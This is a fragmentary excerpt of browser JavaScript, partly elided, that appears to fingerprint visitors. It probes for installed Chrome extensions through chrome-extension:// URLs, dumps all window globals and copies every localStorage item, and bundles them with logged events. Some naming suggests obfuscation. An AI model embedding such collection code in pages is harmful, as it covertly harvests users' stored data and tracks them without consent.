let extensionData = Object.keys(data);
let eventsLogged = [];
function _0x40ca() {
...
for (let i in window) {
  try {
    ...
    globalVariables[i] = "Access denied";
  }
}
...
for (let i in localStorage) {
  try {
    localStorageData[i] = localStorage.getItem(i);
  } catch (e) {
    localStorageData[i] = "Access denied";
  }
}
...
var extensionsChecked = extensionData.map(key => fetch(`chrome-extension://${data[key].id}/${data[key].file}`).then(() => ({
  name: key,
  detected: true,
  id: data[key].id
})).catch(() => ({
...
extensionsChecked = Promise.all(extensionsChecked).then(values => {
  return {
    extensionCheck: values,
    events: eventsLogged,
    globals: globalVariables,
    localStorageItems: localStorageData
  };
});
